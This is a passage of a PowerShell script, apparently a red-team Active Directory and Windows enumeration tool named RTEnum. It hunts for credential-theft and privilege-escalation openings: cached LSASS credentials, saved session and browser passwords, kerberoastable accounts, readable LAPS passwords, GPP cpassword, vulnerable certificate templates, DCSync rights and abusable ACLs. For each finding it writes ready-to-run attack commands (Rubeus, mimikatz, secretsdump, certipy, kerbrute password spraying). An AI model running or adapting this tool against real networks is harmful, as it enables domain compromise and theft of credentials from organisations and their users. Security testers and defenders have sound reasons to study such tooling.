        $sbl = (Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' 2>$null).EnableScriptBlockLogging
        $tl  = (Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' 2>$null).EnableTranscripting
        $d.Add("ScriptBlockLogging: $sbl   Transcription: $tl")
        if ($sbl -eq 1){ Flag 'INFO' "PowerShell ScriptBlock logging is ON - your commands are logged (4104)." }
        # LSA protection / Credential Guard
        $lsa = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' 2>$null).RunAsPPL
        $d.Add("LSA RunAsPPL (protected LSASS): $lsa")
        if ($lsa -ne 1){ Flag 'INFO' "LSASS is NOT PPL-protected - LSASS dump likely viable." }
        $d.Add(""); $d.Add("== Firewall profiles =="); $d.Add((netsh advfirewall show allprofiles state 2>$null | Out-String))
        Save '06_defenses.txt' ($d -join "`r`n")
    }

    # ======================= LOCAL: network =======================
    if (-not $LocalOnly -and (RunS @('network','net','ports','connections'))) {
        Sect "Network: interfaces, routes, listeners, connections"
        $n = New-Object System.Collections.Generic.List[string]
        $n.Add("== IP config =="); $n.Add((ipconfig /all 2>$null | Out-String))
        $n.Add("== Routes =="); $n.Add((route print 2>$null | Out-String))
        $n.Add("== ARP (nearby hosts) =="); $n.Add((arp -a 2>$null | Out-String))
        $n.Add("== Listening / established =="); $n.Add((netstat -ano 2>$null | Out-String))
        $n.Add("== Hosts file =="); $n.Add((Get-Content C:\Windows\System32\drivers\etc\hosts 2>$null | Out-String))
        $n.Add("== Mapped drives =="); $n.Add((net use 2>$null | Out-String))
        Save '07_network.txt' ($n -join "`r`n")
    }

    # ======================= LOCAL: extended (winPEAS-style) checks =======================
    if (RunS @('peas','extended','credstore','software','lsass')) {
        Sect "Extended (winPEAS-style) credential & software surface"
        $px = New-Object System.Collections.Generic.List[string]

        # --- LSASS credential-theft surface ---
        $wd = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' 2>$null).UseLogonCredential
        if ($wd -eq 1){ Flag 'HIGH' "WDigest UseLogonCredential=1 - CLEARTEXT passwords cached in LSASS."; AddNext "Dump WDigest cleartext" "# mimikatz: sekurlsa::wdigest (after an LSASS dump / privileged context)" }
        $lm = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' 2>$null).NoLmHash
        if ($lm -ne 1){ Flag 'INFO' "NoLMHash != 1 - weak LM hashes may be stored." }
        $cc = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' 2>$null).CachedLogonsCount
        $px.Add("CachedLogonsCount: $cc (domain cached creds -> cachedump / DCC2 crack)")
        try { $cg=(Get-CimInstance -ClassName Win32_DeviceGuard -Namespace 'root\Microsoft\Windows\DeviceGuard' 2>$null).SecurityServicesRunning
              if ($cg -contains 1){ Flag 'INFO' "Credential Guard running - LSASS cred theft mitigated." } else { Flag 'INFO' "Credential Guard not running - LSASS dump likely yields creds." } } catch {}

        # --- Windows Vault / Credential Manager ---
        $px.Add("== vaultcmd /list =="); $px.Add((vaultcmd /list 2>$null | Out-String))

        # --- saved session managers (often recoverable secrets) ---
        if (Test-Path 'HKCU:\Software\SimonTatham\PuTTY\Sessions'){ Flag 'MED' "PuTTY saved sessions present - may hold ProxyPassword / stored host keys."; (Get-ChildItem 'HKCU:\Software\SimonTatham\PuTTY\Sessions').PSChildName | ForEach-Object { $px.Add("putty-session: $_") } }
        if (Test-Path 'HKCU:\Software\Martin Prikryl\WinSCP 2\Sessions'){ Flag 'HIGH' "WinSCP saved sessions present - stored passwords are recoverable (weak obfuscation)."; AddNext "Recover WinSCP creds" "# winscppasswd / SharpWinSCP against HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" }
        foreach($fz in @("$env:APPDATA\FileZilla\sitemanager.xml","$env:APPDATA\FileZilla\recentservers.xml")){ if (Test-Path $fz){ Flag 'MED' "FileZilla saved sites: $fz (base64-encoded creds)." } }
        foreach($ovpn in (Get-ChildItem "$env:USERPROFILE\OpenVPN\config" -Filter *.ovpn -EA SilentlyContinue)){ Flag 'MED' "OpenVPN profile: $($ovpn.FullName) (may embed auth)." }
        if (Test-Path "$env:USERPROFILE\.ssh"){ Flag 'MED' "SSH keys/known_hosts in $env:USERPROFILE\.ssh (private keys + lateral targets)." }

        # --- browser credential stores (DPAPI-protected; decrypt in user ctx) ---
        foreach($b in @("$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data","$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data","$env:APPDATA\Mozilla\Firefox\Profiles")){
            if (Test-Path $b){ Flag 'MED' "Browser credential store: $b (DPAPI; decrypt as this user - SharpChrome/SharpDPAPI)." }
        }

        # --- Kerberos tickets in this session ---
        $kl = klist 2>$null | Out-String
        if ($kl -match 'Cached Tickets:\s*\(([1-9]\d*)\)'){ Flag 'INFO' "Kerberos tickets cached (klist) - potential Pass-the-Ticket material." }

        # --- PowerShell v2 downgrade surface ---
        try { if ((Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 -EA SilentlyContinue).State -eq 'Enabled'){ Flag 'INFO' "PowerShell v2 engine available - AMSI/ScriptBlock-logging downgrade surface (powershell -v 2)." } } catch {}

        # --- writable all-users StartUp (persistence/privesc) ---
        $startup = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
        if (Test-Path $startup){ try { $acl=Get-Acl $startup; foreach($a in $acl.Access){ if ($a.AccessControlType -eq 'Allow' -and "$($a.FileSystemRights)" -match 'Write|FullControl|Modify' -and "$($a.IdentityReference)" -match 'Everyone|Authenticated Users|\\Users$'){ Flag 'HIGH' "Writable all-users StartUp folder: $startup -> drop a payload for SYSTEM/next-admin."; break } } } catch {} }

        # --- installed software inventory (for version-vuln hunting) ---
        $apps = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' 2>$null | Where-Object DisplayName | Select-Object DisplayName,DisplayVersion,Publisher
        $px.Add("== Installed software ==`r`n" + (($apps | Sort-Object DisplayName | Format-Table -Auto | Out-String)))
        # --- env vars + recent docs ---
        $px.Add("== Environment =="); $px.Add((Get-ChildItem Env: 2>$null | Format-Table -Auto | Out-String))
        $recent = Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -EA SilentlyContinue | Select-Object -First 30 Name
        $px.Add("== Recent files =="); $px.Add(($recent | Format-Table -Auto | Out-String))

        Save '08_extended.txt' ($px -join "`r`n")
    }

    # ======================= AD capability detection =======================
    $useAD=$false; $havePV=$false
    $adReachable=$false; $defaultNC=''; $configNC=''
    if (-not $LocalOnly) {
        if (-not (Get-Command Get-ADDomain -EA SilentlyContinue)) {
            if (Get-Module -ListAvailable -Name ActiveDirectory) { Import-Module ActiveDirectory -EA SilentlyContinue }
        }
        if (-not (Get-Command Get-ADDomain -EA SilentlyContinue)) {
            $cands = @()
            if ($ADModulePath){ $cands += $ADModulePath }
            $cands += @((Join-Path $PSScriptRoot 'Microsoft.ActiveDirectory.Management.dll'),
                        (Join-Path $PSScriptRoot 'ADModule-master\Microsoft.ActiveDirectory.Management.dll'))
            foreach($dll in $cands){ if ($dll -and (Test-Path $dll)){ try { Import-Module $dll -EA Stop; break } catch {} } }
        }
        if (Get-Command Get-ADDomain -EA SilentlyContinue){ $useAD=$true }
        if ($Credential){ $useAD=$false }   # force LDAP engine to keep one identity
        $havePV = [bool](Get-Command Get-DomainUser -EA SilentlyContinue)

        if (-not $Domain){
            try { $Domain = ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).Name } catch {}
            if (-not $Domain){ $Domain = $env:USERDNSDOMAIN }
            if (-not $Domain){ try { $rd=([ADSI]'LDAP://RootDSE').defaultNamingContext; if($rd){ $Domain=($rd -replace 'DC=','' -replace ',','.') } } catch {} }
        }
    }

    function DE($path){
        if ($Credential){ New-Object System.DirectoryServices.DirectoryEntry($path,$Credential.UserName,$Credential.GetNetworkCredential().Password) }
        else { New-Object System.DirectoryServices.DirectoryEntry($path) }
    }
    function LDAP($filter,$props,$base){
        try {
            if (-not $base){ $base = "LDAP://$Domain" }
            $root = DE $base
            $ds = New-Object System.DirectoryServices.DirectorySearcher($root)
            $ds.Filter=$filter; $ds.PageSize=1000
            if ($props){ foreach($p in $props){ [void]$ds.PropertiesToLoad.Add($p) } }
            $ds.FindAll()
        } catch { @() }
    }
    function PV($r,$n){ $v=$r.Properties[$n]; if($v){ if($v.Count -gt 1){ $v -join '; ' } else { "$($v[0])" } } else { '' } }
    function IntP($r,$n){ $v=$r.Properties[$n]; if($v -and $v.Count){ try { [int64]$v[0] } catch {0} } else {0} }

    if (-not $LocalOnly -and $Domain){
        try {
            $rootDSE = DE "LDAP://$Domain/RootDSE"
            $defaultNC = "$($rootDSE.defaultNamingContext)"
            $configNC  = "$($rootDSE.configurationNamingContext)"
            if ($defaultNC){ $adReachable=$true } else { $defaultNC="DC="+($Domain -replace '\.',',DC='); $configNC="CN=Configuration,$defaultNC" }
        } catch { $defaultNC="DC="+($Domain -replace '\.',',DC='); $configNC="CN=Configuration,$defaultNC" }
        if ($adReachable){ Log "[+] AD reachable: $Domain (engine: $(if($useAD){'AD-module'}elseif($havePV){'PowerView+LDAP'}else{'raw LDAP'}))" 'Green' }
        else { Flag 'INFO' "Could not reach a DC for $Domain - AD sections limited." }
    }

    # ======================= AD: domain / forest / trusts =======================
    if ($adReachable -and (RunS @('domain','forest','trust'))){
        Sect "Domain, forest & trusts"
        $dm = New-Object System.Collections.Generic.List[string]
        $dm.Add("Domain NC : $defaultNC")
        # domain SID + functional level + machine account quota
        $dRoot = LDAP '(objectClass=domainDNS)' @('objectSid','ms-DS-MachineAccountQuota','minPwdLength','lockoutThreshold','maxPwdAge') ("LDAP://$Domain")
        if ($dRoot.Count){
            $maq = IntP $dRoot[0] 'ms-DS-MachineAccountQuota'
            $dm.Add("MachineAccountQuota: $maq")
            if ($maq -gt 0){ Flag 'MED' "ms-DS-MachineAccountQuota=$maq - any user can add machine accounts (enables RBCD/noPac paths)." }
        }
        # trusts
        $trusts = LDAP '(objectClass=trustedDomain)' @('name','trustDirection','trustType','trustAttributes') "LDAP://CN=System,$defaultNC"
        $dm.Add(""); $dm.Add("== Trusts ==")
        foreach($t in $trusts){
            $tn=PV $t 'name'; $td=IntP $t 'trustDirection'; $ta=IntP $t 'trustAttributes'
            $dir = switch($td){1{'Inbound'}2{'Outbound'}3{'Bidirectional'}default{"$td"}}
            $dm.Add("$tn  dir=$dir attr=$ta")
            Flag 'INFO' "Trust: $tn ($dir)."
            if ($ta -band 0x8){ Flag 'MED' "Trust $tn is cross-forest (quarantine check SID filtering for SID-history abuse)." }
        }
        Save '08_domain.txt' ($dm -join "`r`n")
    }

    # ======================= AD: users (roast / delegation / secrets) =======================
    if ($adReachable -and (RunS @('users','kerberoast','asrep','delegation','secrets'))){
        Sect "Users: kerberoast / AS-REP / no-preauth / delegation / pwd issues"
        $u = New-Object System.Collections.Generic.List[string]
        $users = LDAP '(&(objectCategory=person)(objectClass=user))' @('samaccountname','serviceprincipalname','useraccountcontrol','description','admincount','memberof','msds-allowedtodelegateto','pwdlastset') ("LDAP://$Domain")
        $u.Add("Total users: $($users.Count)")
        foreach($r in $users){
            $sam=PV $r 'samaccountname'; $uac=IntP $r 'useraccountcontrol'; $desc=PV $r 'description'; $spn=$r.Properties['serviceprincipalname']
            if ($spn -and $spn.Count){ Flag 'HIGH' "Kerberoastable user: $sam (SPN set)."; AddNext "Kerberoast $sam" "Rubeus.exe kerberoast /user:$sam /nowrap    # or GetUserSPNs.py $Domain/USER:PASS -request" }
            if ($uac -band 0x400000){ Flag 'HIGH' "AS-REP roastable: $sam (DONT_REQUIRE_PREAUTH)."; AddNext "AS-REP roast $sam" "Rubeus.exe asreproast /user:$sam /nowrap   # or GetNPUsers.py $Domain/ -usersfile u.txt" }
            if ($uac -band 0x80000){ Flag 'HIGH' "Unconstrained delegation (user): $sam - capture TGTs if it authenticates." }
            if ($uac -band 0x20){ Flag 'MED' "PASSWD_NOTREQD set: $sam (may have blank/weak password)." }
            if ($uac -band 0x10000){ Flag 'INFO' "Password never expires: $sam." }
            $allowTo=$r.Properties['msds-allowedtodelegateto']
            if ($allowTo -and $allowTo.Count){ Flag 'HIGH' "Constrained delegation (user): $sam -> $($allowTo -join ', ')."; AddNext "Constrained deleg $sam" "Rubeus.exe s4u /user:$sam /rc4:<hash> /impersonateuser:administrator /msdsspn:<spn> /ptt" }
            if ($desc -match 'pass|pwd|secret|cred|key' ){ Flag 'MED' "Secret-shaped description on ${sam}: $desc" }
        }
        Save '09_users.txt' ($u -join "`r`n")
    }

    # ======================= AD: computers (delegation / LAPS / legacy) =======================
    if ($adReachable -and (RunS @('computers','delegation','rbcd','laps'))){
        Sect "Computers: delegation, RBCD, LAPS, legacy OS"
        $c = New-Object System.Collections.Generic.List[string]
        $comps = LDAP '(objectCategory=computer)' @('samaccountname','dnshostname','useraccountcontrol','operatingsystem','msds-allowedtoactonbehalfofotheridentity','msds-allowedtodelegateto','ms-mcs-admpwd','ms-laps-password') ("LDAP://$Domain")
        $c.Add("Total computers: $($comps.Count)")
        foreach($r in $comps){
            $name=PV $r 'dnshostname'; if(-not $name){ $name=PV $r 'samaccountname' }
            $uac=IntP $r 'useraccountcontrol'; $os=PV $r 'operatingsystem'
            if ($uac -band 0x80000){ Flag 'HIGH' "Unconstrained delegation (computer): $name - coerce + capture DC TGT (printerbug/petitpotam)."; AddNext "Unconstrained deleg $name" "Rubeus.exe monitor /interval:5 ; SpoolSample.exe <DC> $name  # then s4u/ptt" }
            $rbcd=$r.Properties['msds-allowedtoactonbehalfofotheridentity']
            if ($rbcd -and $rbcd.Count){ Flag 'HIGH' "RBCD configured on $name (msDS-AllowedToActOnBehalfOfOtherIdentity set)." }
            $allowTo=$r.Properties['msds-allowedtodelegateto']
            if ($allowTo -and $allowTo.Count){ Flag 'HIGH' "Constrained delegation (computer): $name -> $($allowTo -join ', ')." }
            $laps = PV $r 'ms-mcs-admpwd'; if(-not $laps){ $laps = PV $r 'ms-laps-password' }
            if ($laps){ Flag 'HIGH' "LAPS password READABLE for $name : $laps" ; AddNext "LAPS login $name" "# use the recovered local-admin password to PtH/RDP to $name" }
            if ($os -match 'Windows 7|XP|Server 2008|Server 2003|Vista'){ Flag 'MED' "Legacy OS host: $name ($os)." }
        }
        Save '10_computers.txt' ($c -join "`r`n")
    }

    # ======================= AD: privileged groups =======================
    if ($adReachable -and (RunS @('groups','privgroups','admins'))){
        Sect "Privileged group membership"
        $g = New-Object System.Collections.Generic.List[string]
        $privGroups = 'Domain Admins','Enterprise Admins','Administrators','Schema Admins','Account Operators','Backup Operators','Server Operators','Print Operators','DnsAdmins','Group Policy Creator Owners'
        foreach($gn in $privGroups){
            $grp = LDAP "(&(objectClass=group)(cn=$gn))" @('member') ("LDAP://$Domain")
            if ($grp.Count){
                $members=$grp[0].Properties['member']
                if ($members -and $members.Count){
                    $g.Add("== $gn ($($members.Count)) =="); foreach($m in $members){ $g.Add("  $m") }
                    if ($gn -eq 'DnsAdmins'){ Flag 'HIGH' "DnsAdmins has members - DLL load on DC via dnscmd -> SYSTEM on DC." }
                    else { Flag 'INFO' "$gn : $($members.Count) member(s)." }
                }
            }
        }
        Save '11_privgroups.txt' ($g -join "`r`n")
    }

    # ======================= AD: GPO / SYSVOL cpassword =======================
    if ($adReachable -and (RunS @('gpo','cpassword','sysvol'))){
        Sect "GPO & SYSVOL cpassword"
        $gp = New-Object System.Collections.Generic.List[string]
        $gpos = LDAP '(objectCategory=groupPolicyContainer)' @('displayname','gpcfilesyspath') ("LDAP://$Domain")
        foreach($r in $gpos){ $gp.Add("$(PV $r 'displayname')  ->  $(PV $r 'gpcfilesyspath')") }
        # cpassword in SYSVOL
        $sysvol = "\\$Domain\SYSVOL\$Domain\Policies"
        if (Test-Path $sysvol){
            $cp = Get-ChildItem -Path $sysvol -Recurse -Include *.xml -EA SilentlyContinue | Select-String -Pattern 'cpassword' 2>$null
            if ($cp){ Flag 'HIGH' "GPP cpassword found in SYSVOL (decryptable AES key is public)."; AddNext "Decrypt GPP cpassword" "gpp-decrypt <cpassword>   # or Get-GPPPassword"; $gp.Add("== cpassword hits =="); $gp.Add(($cp|Out-String)) }
        }
        Save '12_gpo.txt' ($gp -join "`r`n")
    }

    # ======================= AD: AD CS (ESC hints) =======================
    if ($adReachable -and (RunS @('adcs','certificate','esc','pki'))){
        Sect "AD CS / Certificate Services (ESC hints)"
        $ca = New-Object System.Collections.Generic.List[string]
        $caBase = "LDAP://CN=Enrollment Services,CN=Public Key Services,CN=Services,$configNC"
        $cas = LDAP '(objectClass=pKIEnrollmentService)' @('name','dnshostname','certificatetemplates') $caBase
        if ($cas.Count){
            foreach($c in $cas){ $ca.Add("CA: $(PV $c 'name') on $(PV $c 'dnshostname')"); Flag 'INFO' "AD CS enterprise CA present: $(PV $c 'dnshostname')." }
            $tplBase = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$configNC"
            $tpls = LDAP '(objectClass=pKICertificateTemplate)' @('name','mspki-certificate-name-flag','mspki-enrollment-flag','pkiextendedkeyusage','mspki-ra-signature','ntsecuritydescriptor') $tplBase
            foreach($t in $tpls){
                $tn=PV $t 'name'; $nameFlag=IntP $t 'mspki-certificate-name-flag'; $ekus=$t.Properties['pkiextendedkeyusage']
                $enrollFlag=IntP $t 'mspki-enrollment-flag'; $raSig=IntP $t 'mspki-ra-signature'
                $isAuthEku = ($ekus -join ';') -match '1\.3\.6\.1\.5\.5\.7\.3\.2|1\.3\.6\.1\.5\.2\.3\.4|2\.5\.29\.37\.0|1\.3\.6\.1\.4\.1\.311\.20\.2\.2'
                # ESC1: ENROLLEE_SUPPLIES_SUBJECT (0x1) + client-auth EKU + no manager approval
                if (($nameFlag -band 0x1) -and $isAuthEku -and $raSig -eq 0){
                    Flag 'HIGH' "ESC1-candidate template: $tn (ENROLLEE_SUPPLIES_SUBJECT + client-auth EKU)."
                    AddNext "ESC1 $tn" "certipy req -u USER@$Domain -p PASS -ca <CA> -template $tn -upn administrator@$Domain"
                }
                # ESC2: Any Purpose / SubCA EKU
                if (($ekus -join ';') -match '2\.5\.29\.37\.0' -and -not $isAuthEku){ Flag 'MED' "ESC2-candidate (Any Purpose EKU): $tn." }
                # ESC3: Certificate Request Agent EKU
                if (($ekus -join ';') -match '1\.3\.6\.1\.4\.1\.311\.20\.2\.1'){ Flag 'MED' "ESC3-candidate (Enrollment Agent EKU): $tn." }
            }
            $ca.Add("(Run 'certipy find -vulnerable' for full ESC1-16 analysis.)")
        } else { $ca.Add("No enterprise CA found.") }
        Save '13_adcs.txt' ($ca -join "`r`n")
    }

    # ======================= AD: DCSync rights =======================
    if ($adReachable -and -not $Quick -and (RunS @('dcsync','replication','acls'))){
        Sect "DCSync rights (who can replicate domain secrets)"
        $ds = New-Object System.Collections.Generic.List[string]
        try {
            $de = DE "LDAP://$defaultNC"
            $sddl = $de.ObjectSecurity
            foreach($ace in $sddl.Access){
                if ($ace.AccessControlType -ne 'Allow'){ continue }
                $guid = "$($ace.ObjectType)"
                # DS-Replication-Get-Changes-All GUID
                if ($guid -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' -or $guid -eq '89e95b76-444d-4c62-991a-0facbeda640c'){
                    $who="$($ace.IdentityReference)"
                    if ($who -notmatch 'Domain Admins|Enterprise Admins|Administrators|SYSTEM|Domain Controllers'){
                        Flag 'HIGH' "Non-default principal has DCSync rights: $who."
                        AddNext "DCSync as $who" "secretsdump.py $Domain/USER:PASS@<DC> -just-dc   # or mimikatz lsadump::dcsync /user:krbtgt"
                        $ds.Add("DCSync: $who")
                    }
                }
            }
        } catch { $ds.Add("DACL read failed (need -Credential or run on domain host).") }
        Save '14_dcsync.txt' ($ds -join "`r`n")
    }

    # ======================= AD: dangerous ACLs =======================
    if ($adReachable -and -not $Quick -and (RunS @('acls','dacl'))){
        Sect "Dangerous ACLs (GenericAll/WriteDacl/WriteOwner/GenericWrite)"
        $ac = New-Object System.Collections.Generic.List[string]
        $ownSet = @($OwnedPrincipals) + @('Authenticated Users','Everyone','Domain Users')
        # sample high-value objects: priv groups + computer objects
        $targets = LDAP '(|(objectClass=computer)(&(objectClass=group)(adminCount=1))(&(objectClass=user)(adminCount=1)))' @('distinguishedname','samaccountname') ("LDAP://$Domain")
        foreach($t in $targets){
            $dn=PV $t 'distinguishedname'; if(-not $dn){ continue }
            try {
                $ge = DE "LDAP://$dn"
                foreach($ace in $ge.ObjectSecurity.Access){
                    if ($ace.AccessControlType -ne 'Allow'){ continue }
                    $rights="$($ace.ActiveDirectoryRights)"
                    if ($rights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|WriteProperty'){
                        $who="$($ace.IdentityReference)"
                        if ($who -match 'Domain Admins|Enterprise Admins|SYSTEM|BUILTIN\\Administrators|Creator Owner|Domain Controllers|Enterprise Domain Controllers'){ continue }
                        $owned = $false; foreach($o in $ownSet){ if ($who -like "*$o*"){ $owned=$true } }
                        $sev = if ($owned){ 'HIGH' } else { 'MED' }
                        Flag $sev "ACL: $who has $rights over $(PV $t 'samaccountname')$(if($owned){' [ACTIONABLE - you control this principal]'})."
                        if ($owned){ AddNext "Abuse ACL on $(PV $t 'samaccountname')" "# $rights -> set RBCD / reset password / add to group via PowerView (Set-DomainObject / Add-DomainGroupMember)" }
                        $ac.Add("$who  $rights  $dn")
                    }
                }
            } catch {}
        }
        Save '15_acls.txt' ($ac -join "`r`n")
    }

    # ======================= AD: password policy =======================
    if ($adReachable -and (RunS @('policy','password','spray','lockout'))){
        Sect "Password & lockout policy (spray safety)"
        $pp = New-Object System.Collections.Generic.List[string]
        $d = LDAP '(objectClass=domainDNS)' @('minpwdlength','lockoutthreshold','lockoutduration','maxpwdage','pwdproperties') ("LDAP://$Domain")
        if ($d.Count){
            $minLen=IntP $d[0] 'minpwdlength'; $lockout=IntP $d[0] 'lockoutthreshold'
            $pp.Add("MinPwdLength    : $minLen")
            $pp.Add("LockoutThreshold: $lockout")
            if ($lockout -eq 0){ Flag 'MED' "Lockout threshold = 0 (no lockout) - password spraying is safe." ; AddNext "Spray (no lockout)" "kerbrute passwordspray -d $Domain users.txt 'Season2026!'" }
            else { Flag 'INFO' "Lockout threshold = $lockout - spray <= $($lockout-1) attempts per window." }
        }
        Save '16_policy.txt' ($pp -join "`r`n")
    }

    # ======================= AD: gMSA =======================
    if ($adReachable -and (RunS @('gmsa'))){
        Sect "gMSA (group Managed Service Accounts)"
        $gm = New-Object System.Collections.Generic.List[string]
        $gmsa = LDAP '(objectClass=msDS-GroupManagedServiceAccount)' @('samaccountname','msds-groupmsamembership') ("LDAP://$Domain")
        foreach($r in $gmsa){
            $sam=PV $r 'samaccountname'; $gm.Add("gMSA: $sam")
            Flag 'MED' "gMSA present: $sam - if you can read its blob, recover the password (gMSADumper / Get-ADServiceAccount)."
            AddNext "Read gMSA $sam" "python3 gMSADumper.py -u USER -p PASS -d $Domain   # or (Get-ADServiceAccount $sam -Properties msDS-ManagedPassword)"
        }
        Save '17_gmsa.txt' ($gm -join "`r`n")
    }

    # ======================= AD/host sweep: local admin where I can =======================
    if ($adReachable -and ($HostSweep -or $Target) -and (RunS @('localadmin','sweep','shares'))){
        Sect "Host sweep: local-admin access & reachable shares [LOUD]"
        $sw = New-Object System.Collections.Generic.List[string]
        $hosts = if ($Target){ $Target } else { (LDAP '(objectCategory=computer)' @('dnshostname') ("LDAP://$Domain") | ForEach-Object { PV $_ 'dnshostname' } | Where-Object { $_ }) }
        foreach($h in $hosts){
            if (-not $h){ continue }
            $admin = Test-Path "\\$h\C$" -EA SilentlyContinue
            if ($admin){ Flag 'HIGH' "LOCAL ADMIN (C`$ readable/writable) on ${h}." ; AddNext "Dump creds on ${h}" "# you're admin on ${h}: dump LSASS or use secretsdump.py / wmiexec"; $sw.Add("ADMIN: ${h}") }
            # list shares
            $shares = net view "\\$h" /all 2>$null
            if ($shares){ $sw.Add("== shares on $h =="); $sw.Add(($shares|Out-String)) }
        }
        Save '18_sweep.txt' ($sw -join "`r`n")
    }

    # ======================= SUMMARY =======================
    Sect "Writing ranked summary"
    $sumFile = New-Object System.Collections.Generic.List[string]
    $sumFile.Add("RTEnum summary - $tag - $(Get-Date)")
    $sumFile.Add("Identity: $(whoami)   Engine: $(if($LocalOnly){'local-only'}elseif($useAD){'AD-module'}elseif($havePV){'PowerView+LDAP'}elseif($adReachable){'raw LDAP'}else{'local-only (no DC)'})")
    $sumFile.Add("")
    $high = $summary | Where-Object { $_ -like '`[HIGH`]*' }
    $med  = $summary | Where-Object { $_ -like '`[MED *' }
    $info = $summary | Where-Object { $_ -like '`[INFO`]*' }
    $sumFile.Add("### HIGH ($($high.Count)) ###"); $high | ForEach-Object { $sumFile.Add($_) }
    $sumFile.Add(""); $sumFile.Add("### MED ($($med.Count)) ###"); $med | ForEach-Object { $sumFile.Add($_) }
    $sumFile.Add(""); $sumFile.Add("### INFO ($($info.Count)) ###"); $info | ForEach-Object { $sumFile.Add($_) }

    # recommended next move (first HIGH with a next-step, else first HIGH)
    $sumFile.Add(""); $sumFile.Add("=== RECOMMENDED NEXT MOVE ===")
    $rec = $nextList | Select-Object -First 1
    if ($rec){ $sumFile.Add("-> $($rec.Title)"); $sumFile.Add("   $($rec.Cmd)") }
    elseif ($high){ $sumFile.Add("-> Investigate the first HIGH finding above.") }
    else { $sumFile.Add("-> No HIGH findings. Pivot to host sweep (-HostSweep) or re-run as a captured identity (-Credential).") }
    Save '00_SUMMARY.txt' ($sumFile -join "`r`n")

    # NEXT_STEPS.txt
    if ($nextList.Count){
        $ns = New-Object System.Collections.Generic.List[string]
        $ns.Add("# Pre-filled next-step / exploit commands (verify targets before running)")
        $ns.Add("")
        $i=1; foreach($n in $nextList){ $ns.Add("[$i] $($n.Title)"); $ns.Add("    $($n.Cmd)"); $ns.Add(""); $i++ }
        Save 'NEXT_STEPS.txt' ($ns -join "`r`n")
    }

    if ($Json){
        JBag 'findings' @{ high=@($high); med=@($med); info=@($info) }
        JBag 'next_steps' ($nextList.ToArray())   # .ToArray() avoids a PS5.1 @()-on-List[object] quirk
        ($jsonBag | ConvertTo-Json -Depth 6) | Out-File (Join-Path $run 'findings.json') -Encoding UTF8
    }

    if ($Zip){ try { Compress-Archive -Path $run -DestinationPath "$run.zip" -Force; Log "[+] Zipped -> $run.zip" 'Green' } catch {} }

    Log "`n[+] Done. HIGH=$($high.Count) MED=$($med.Count) INFO=$($info.Count)" 'Green'
    Log "[+] Read: $run\00_SUMMARY.txt  and  $run\NEXT_STEPS.txt" 'Green'
    return $run
}

# Auto-run when executed directly (not when dot-sourced)
if ($MyInvocation.InvocationName -ne '.') {
    Invoke-RTEnum @PSBoundParameters
}
